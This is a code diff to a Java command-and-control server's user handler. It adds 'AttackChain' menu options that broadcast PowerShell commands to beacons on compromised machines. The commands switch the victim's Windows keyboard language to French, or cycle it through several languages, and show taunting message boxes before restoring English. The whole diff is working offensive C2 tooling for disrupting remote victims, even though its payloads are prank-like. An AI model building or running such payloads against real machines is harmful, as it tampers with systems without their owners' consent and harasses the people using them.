@@ -311,13 +311,43 @@ public class C2ServerUserHandler implements Runnable{
             } else if(currentUserPath.equals("AttackChain")){
                 printAttackChain();
                 System.out.println("1. THE GOOSE");
-                System.out.println("2. Back");
+                System.out.println("2. Change Keyboard Language [EASY]");
+                System.out.println("3. Change Keybaord Layout [HARD]");
+                System.out.println("4. Back");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
                 if(userInput.equals("1")){
                     // TODO: Figure out how to launch the goose.
                 } else if (userInput.equals("2")){
+                    // Set their Keybaord language to French for 60 seconds, then change it back to English
+                    String commands = "";
+                    commands += "Set-WinUserLanguageList fr-FR;";
+                    commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    commands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
+                    commands += "Start-Sleep -Seconds 60;";
+                    commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
+                    commands += "Set-WinUserLanguageList en-US;";
+                    C2server.broadcastToBeacons(commands);
+                } else if (userInput.equals("3")){
+                    // Change their Keybaord language every 30 seconds
+                    HashMap<String, String> languages = new HashMap<>();
+                    String commands = "";
+                    languages.put("French", "fr-FR");
+                    languages.put("German", "de-DE");
+                    languages.put("Arabic", "ar-SA");
+                    languages.put("Cantonese", "zh-HK");
+                    languages.put("Italian","it-IT");
+                    for(String language : languages.keySet()){
+                        commands += "Set-WinUserLanguageList " + languages.get(language) + ";";
+                        commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                        commands += "[System.Windows.MessageBox]::Show('Have Fun Learning " + language + " MF');";
+                        commands += "Start-Sleep -Seconds 30;";
+                    }
+                    commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
+                    commands += "Set-WinUserLanguageList en-US;";
+                    C2server.broadcastToBeacons(commands);
+                } else if (userInput.equals("4")){
                     currentUserPath = "";
                 } else {
                     System.out.println("Invalid Input");
